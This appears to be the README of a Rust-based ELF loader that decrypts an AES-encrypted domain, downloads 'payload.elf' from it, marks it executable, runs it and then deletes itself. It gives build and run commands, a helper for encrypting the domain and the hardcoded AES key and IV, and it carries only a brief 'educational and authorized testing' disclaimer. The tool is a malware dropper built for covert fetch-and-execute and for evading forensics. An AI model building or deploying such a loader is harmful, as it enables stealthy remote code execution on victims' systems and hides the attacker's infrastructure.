# ELF Loader V2

A Rust-based ELF loader that decrypts an AES-encrypted domain, downloads a payload, and executes it.

## Features

- AES-128-CBC decryption of base64-encoded domains
- HTTP download of ELF payloads
- Automatic execution with proper permissions
- Self-cleanup after execution

## Building

```bash
cargo build --release
```

## Usage

```bash
./target/release/loaderV2 <base64_aes_encrypted_domain>
```

### Example

1. **Encrypt a domain** (using the helper script):
   ```bash
   # First install the required Python library
   pip3 install pycryptodome
   
   # Encrypt your domain
   python3 encrypt_domain.py example.com
   ```

2. **Run the loader**:
   ```bash
   ./target/release/loaderV2 'YOUR_ENCRYPTED_BASE64_STRING'
   ```

## How it works

1. **Decryption**: Uses AES-128-CBC with hardcoded key/IV to decrypt the domain
2. **Download**: Fetches `http://{decrypted_domain}/payload.elf`
3. **Execute**: Makes the ELF executable and runs it
4. **Cleanup**: Removes the downloaded file and self-destructs

## Security Configuration

The AES key and IV are currently hardcoded in `src/main.rs`:

```rust
let key = b"0123456789abcdef"; // 16 bytes AES-128 key
let iv  = b"abcdef9876543210"; // 16 bytes IV
```

**⚠️ Important**: Change these values before production use!

## Dependencies

- `reqwest` - HTTP client
- `aes` - AES encryption
- `cbc` - CBC mode
- `base64` - Base64 encoding/decoding

## Platform Support

- Linux (primary target)
- Unix-like systems with executable permissions support

## License

This tool is for educational and authorized testing purposes only.
